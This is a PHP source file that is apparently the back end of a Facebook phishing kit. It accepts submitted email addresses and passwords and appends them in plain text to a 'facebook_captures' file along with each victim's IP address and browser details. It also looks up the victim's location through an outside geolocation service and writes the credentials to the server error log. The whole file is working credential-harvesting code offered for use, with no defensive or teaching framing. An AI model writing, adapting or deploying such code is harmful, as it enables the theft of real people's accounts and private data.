<?php
// Enable error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 0);

// CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Read POST data
$raw_body = file_get_contents('php://input');

// Parse form-urlencoded or JSON
$email = '';
$password = '';
$step = '';

if (strpos($raw_body, 'email=') !== false || strpos($raw_body, 'password=') !== false) {
    parse_str($raw_body, $parsed);
    $email = isset($parsed['email']) ? trim($parsed['email']) : '';
    $password = isset($parsed['password']) ? $parsed['password'] : '';
    $step = isset($parsed['step']) ? $parsed['step'] : 'login';
} else {
    $json = json_decode($raw_body, true);
    if ($json) {
        $email = isset($json['email']) ? trim($json['email']) : '';
        $password = isset($json['password']) ? $json['password'] : '';
        $step = isset($json['step']) ? $json['step'] : 'login';
    }
}

// Also check $_POST as fallback
if (empty($email) && isset($_POST['email'])) {
    $email = trim($_POST['email']);
}
if (empty($password) && isset($_POST['password'])) {
    $password = $_POST['password'];
}
if (empty($step) && isset($_POST['step'])) {
    $step = $_POST['step'];
}

// Validate
if (empty($email) || empty($password)) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing fields', 'raw' => $raw_body]);
    exit;
}

// --- Store in plain text file ---
$txt_file = '/tmp/facebook_captures.txt';
$timestamp = date('Y-m-d H:i:s');
$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Format: [timestamp] Step | Email | Password | IP | User-Agent
$line = sprintf(
    "[%s] %-8s | %-35s | %s | %-15s | %s\n",
    $timestamp,
    $step,
    $email,
    $password,
    $ip,
    $user_agent
);

// Append to text file (use LOCK_EX for safety on writable systems)
file_put_contents($txt_file, $line, FILE_APPEND | LOCK_EX);

// Also try to get geolocation via ip-api.com (non-blocking best-effort)
$geo_data = '';
try {
    $geo_url = "http://ip-api.com/json/" . urlencode($ip) . "?fields=status,country,regionName,city,isp,query";
    $geo_response = @file_get_contents($geo_url);
    if ($geo_response) {
        $geo = json_decode($geo_response, true);
        if (isset($geo['status']) && $geo['status'] === 'success') {
            $geo_line = sprintf(
                "  -> GEO: %s, %s, %s | ISP: %s\n",
                $geo['city'] ?? '?',
                $geo['regionName'] ?? '?',
                $geo['country'] ?? '?',
                $geo['isp'] ?? '?'
            );
            file_put_contents($txt_file, $geo_line, FILE_APPEND | LOCK_EX);
        }
    }
} catch (Exception $e) {
    // Silently fail — geolocation is best-effort
}

// Return success
echo json_encode(['status' => 'ok', 'message' => 'Captured']);

// Log to debug (optional — visible in Vercel logs)
error_log("Facebook capture: $step | $email | $password");
?>
